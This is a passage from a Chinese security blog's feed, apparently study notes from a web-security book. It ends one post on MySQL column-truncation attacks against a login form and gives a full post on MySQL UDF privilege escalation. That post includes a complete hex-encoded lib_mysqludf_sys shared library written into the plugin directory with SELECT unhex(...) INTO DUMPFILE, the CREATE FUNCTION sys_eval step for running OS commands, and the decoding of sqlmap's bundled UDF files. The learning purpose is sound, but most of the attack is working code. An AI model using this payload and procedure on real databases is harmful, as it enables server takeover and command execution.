@@sql_mode=&apos;NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;</div></pre></td></tr></table></figure></p><p>可以看到如果想要拿到flag，必须通过login.php里的身份验证，但是我添加了addslashes()函数来转义单引号，而且数据库和页面编码方式都为utf-8，也不能用宽字节注入来做。同时在注册的时候，我也加上了addslashes()函数，导致二次注入也很艰难。<br>但是可以使用以上的攻击方法来修改掉admin的密码。<br><br><br>PS:<br>但是在本地用phpstudy测试的时候发现一个很有意思的东西，当我开启<strong>STRICT_ALL_TABLES</strong>的时候，即如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">set @@sql_mode=&apos;STRICT_TRANS_TABLES,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION&apos;;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/4b7Ys9u.png" alt=""></p><p>此时<img src="https://i.imgur.com/X9taRrp.png" alt=""><br>到这里都是正常的，预料之中的东西。</p><p>但是呢，接下来神奇的事情发生了。<br>这是原表：<br><img src="https://i.imgur.com/SeIR4Bg.png" alt=""></p><p>然后我通过一个php中的mysql_connect来插入同样的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123;</div><div class="line">$uname=addslashes($_POST[&apos;username&apos;]);</div><div class="line">$pw=addslashes($_POST[&apos;password&apos;]);</div><div class="line">    echo strlen($uname).&apos;&lt;br/&gt;&apos;;</div><div class="line">$sql=&quot;insert into strict_test(username,password) values(&apos;$uname&apos;,&apos;$pw&apos;)&quot;;</div><div class="line">echo $sql;</div><div class="line">    $result=mysql_query($sql) or die( mysql_error() );</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/YOCs0rn.png" alt=""><br>并没有报错，同时插入也成功了，而且实现了截断功能：<br><img src="https://i.imgur.com/nBNWTUA.png" alt=""></p><p>一脸懵逼，跪求希望有知道的大佬教教我。。(垃圾mysql_connect，我还是用<del>PDO</del>吧)(PDO也不行)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;2008年，Stefan Esser提出一种名为”SQL Column Truncation”攻击方式，就是以上说的SQL截断攻击。&lt;/p&gt;
    
    </summary>
    
    
      <category term="书籍学习" scheme="http://Err0rzz.github.io/tags/%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="注入" scheme="http://Err0rzz.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>UDF--mysql</title>
    <link href="http://Err0rzz.github.io/2017/12/26/UDF-mysql/"/>
    <id>http://Err0rzz.github.io/2017/12/26/UDF-mysql/</id>
    <published>2017-12-26T07:48:13.000Z</published>
    <updated>2018-04-24T08:07:39.117Z</updated>
    
    <content type="html"><![CDATA[<p>emmm，虽然还是《白帽安全》这本书，但是前端那边的坑有机会再填吧，还是服务器端比较熟悉一点….</p><a id="more"></a><p>虽然这种在sqlmap里用过，但是一直不清楚咋实现的，看了书之后觉得还是记录一下学习过程吧。</p><p><strong>UDF(User-Defined Function,用户自定义函数)</strong><br>在流行的数据库中，一般都支持从本地文件系统中导入一个共享库文件作为自定义函数。使用如下语法可以创建UDF：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">CREATE FUNCTION f_name RETURNS INTEGER SONAME shared_libray</div></pre></td></tr></table></figure></p><p>这里讲一下怎么安装<strong>lib_mysqludf.sys.so</strong>以及利用该.so文件来创建UDF从而执行sys_eval等system函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">函数：</div><div class="line"></div><div class="line">sys_eval，执行任意命令，并将输出返回。</div><div class="line"></div><div class="line">sys_exec，执行任意命令，并将退出码返回。</div><div class="line"></div><div class="line">sys_get，获取一个环境变量。</div><div class="line"></div><div class="line">sys_set，创建或修改一个环境变量。</div></pre></td></tr></table></figure></p><p><br><br><strong>攻击步骤</strong><br>攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。然后，创建UDF。</p><p>lib_mysqludf_sys.dll的导出路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">MySQL&lt;5.0，导出路径随意；</div><div class="line"></div><div class="line">5.0 &lt;= MySQL&lt;5.1，则需要导出至目标服务器的系统目录（如：system32）</div><div class="line"></div><div class="line">MySQL 5.1以上版本，必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</div></pre></td></tr></table></figure></p><p><br></p><h1 id="linux下"><a href="#linux下" class="headerlink" title="linux下"></a>linux下</h1><p>这里有三种方法，<del>前两种虽然都失败了，但是还是记录出来，万一以后成功了呢</del>真的成功了。。<br><br><br><strong>方法一</strong></p><p>下载lib_mysqludf_sys程序：<a href="https://github.com/mysqludf/lib_mysqludf_sys" target="_blank" rel="external">https://github.com/mysqludf/lib_mysqludf_sys</a></p><p>解压后运行：sudo ./install.sh，然而在这里会报错<img src="https://i.imgur.com/VYUHIvA.png" alt=""></p><p>然而各种捣鼓各种百度也不行</p><p>除了运行.sh文件之外，也可以自己编译.so文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -DMYSQL_DYNAMIC_PLUGIN -fPIC -Wall -I/usr/include/mysql -I. -shared lib_mysqludf_sys.c -o lib_mysqludf_sys.so</div></pre></td></tr></table></figure></p><p>但是还是说少个.h文件，百度说这是一个mysql的bug引起的错误，只要修改/usr/include/mysql/my_global.h文件，注释掉626行重新编译就可以了。<del>(结果我连这个目录都没有)</del></p><p>这时候是因为缺少安装一个工具，输入命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libmysqlclient-dev</div></pre></td></tr></table></figure></p><p>安装好就会有/usr/include/mysql目录，下面有所有需要的.h文件</p><p>先继续说下去吧，如果你上面都解决了，那么恭喜你，你快成功了。</p><p>接下来获得这个编译之后的.o文件的十六进制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select hex(load_file(&apos;/root/Desktop/lib_mysqludf_sys-master&apos;)) into outfile &quot;/tmp/hex.txt&quot;;</div></pre></td></tr></table></figure></p><p>然后看一下mysql的plugin目录在哪：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/XdTTsCS.png" alt=""></p><p>再看一下有没有导过：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from mysql.func;</div></pre></td></tr></table></figure></p><p>这里我就不截图了，因为我已经导过了，没有导过的话是空的。</p><p>紧接着将十六进制导入到plugin目录下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select unhex(&apos;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&apos;) into dumpfile &apos;/usr/lib/mysql/plugin/mysqludf.so&apos;;</div></pre></td></tr></table></figure></p><p>现在.o文件已经就位，最后一步就是用一开始说的那个创建UDF的函数来创建就好了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create function sys_eval returns string soname &apos;mysqludf.so&apos;;</div></pre></td></tr></table></figure></p><p>再看看func里有什么：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from mysql.func;</div></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/8Z3Zzz5.png" alt=""><br>可以看到多了个自定义的函数，接着耍耍权限吧：<br><img src="https://i.imgur.com/G4qzHt5.png" alt=""></p><p><br><br><strong>方法二</strong></p><p>和方法一差不多，不过利用的不是github上的源代码，而是sqlmap里自带的lib_mysqludf<em>sys.so</em>文件。</p><p>该文件在我本地的路径是<code>/usr/share/sqlmap/udf/linux/64/</code>，除此之外，udf目录下还有windows版本的文件。</p><p>但是测试的时候你又会惊喜的发现问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; create function sys_eval returns string soname &apos;udf.so&apos;;</div></pre></td></tr></table></figure></p><p>ERROR 1126 (HY000): Can’t open shared library ‘udf.so’ (errno: 22 /usr/lib64/mysql/plugin/udf.so: invalid ELF header)</p><p><del>如果解决了这个问题，那么恭喜你，而且请评论告诉一下我咋做，谢谢大佬们</del>~<br>这是因为sqlmap将此文件编码了一下，只需要用sqlmap/extra/clock/clock.py解锁一下就好了:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cloak.py -d -i /usr/share/sqlmap/udf/mysql/linux/64/lib_mysqludf_sys.so_</div></pre></td></tr></table></figure></p><p>会在.so_文件目录下生成.so文件：<br><img src="https://i.imgur.com/KFRMcbd.png" alt=""><br>该文件和方法一编译成功之后的文件是一样的，所以接下来十六进制什么操作都是一样的。</p><p><br><br><strong>方法三</strong></p><p>这个方法是最简单，最偷懒的。</p><p>因为反正最终目的是要将lib_mysqludf_sys.so编译一下，得到其十六进制数据，再重新写回到plugin目录下，方法一是出错在编译的时候，那我直接就不编译了，将别人编译好的十六进制数据拿来用呗(读书人的是叫借鉴)，接下来参照方法一。</p><h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>自动化注入工具sqlmap已经集成了此功能：<br><img src="https://i.imgur.com/WFjmKLc.png" alt=""></p><p>所以神器就是神器，还是要再研究一下sqlmap用法了。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;emmm，虽然还是《白帽安全》这本书，但是前端那边的坑有机会再填吧，还是服务器端比较熟悉一点….&lt;/p&gt;
    
    </summary>
    
    
      <category term="书籍学习" scheme="http://Err0rzz.github.io/tags/%E4%B9%A6%E7%B1%8D%E5%AD%A6%E4%B9%A0/"/>
    
